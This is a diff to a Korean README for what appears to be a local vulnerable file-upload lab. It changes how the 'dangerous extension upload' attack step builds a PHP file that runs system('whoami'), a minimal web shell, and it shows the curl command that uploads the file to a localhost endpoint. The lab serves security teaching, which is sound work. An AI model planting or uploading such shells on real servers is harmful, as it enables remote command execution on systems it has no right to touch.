@@ -30,9 +30,9 @@ docker-compose up --build
 
 ### 공격 1: 위험한 확장자 업로드
 
-```bash
+```powershell
 # PHP 악성 파일 생성
-python -c "open('test.php','w').write('<?php system(\"whoami\"); ?>')"
+Set-Content -Path test.php -Value '<?php system("whoami"); ?>'
 
 # 업로드
 curl.exe -F "file=@test.php" http://localhost:5001/upload
